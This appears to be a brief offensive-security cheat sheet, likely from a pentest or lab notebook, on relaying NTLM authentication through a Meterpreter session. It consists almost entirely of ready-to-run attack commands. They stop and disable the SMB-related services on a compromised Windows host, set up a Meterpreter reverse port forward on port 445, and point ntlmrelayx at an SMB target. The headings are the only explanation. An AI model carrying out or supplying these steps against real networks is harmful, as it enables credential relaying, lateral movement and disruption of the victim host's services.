# Remote NTLM Relaying via Meterpreter
- On the victim machine
```powershell
sc stop netlogon
sc stop lanmanserver
sc config lanmanserver start= disabled
sc stop lanmanworkstation
sc config lanmanworkstation start= disabled
```
- In Meterpreter session
```powershell
portfwd add -R -L 0.0.0.0 -l 445 -p 445
```
- On ntlmrelayx
```powershell
ntlmrelayx.py -t smb://10.200.69.30 -smb2support
```
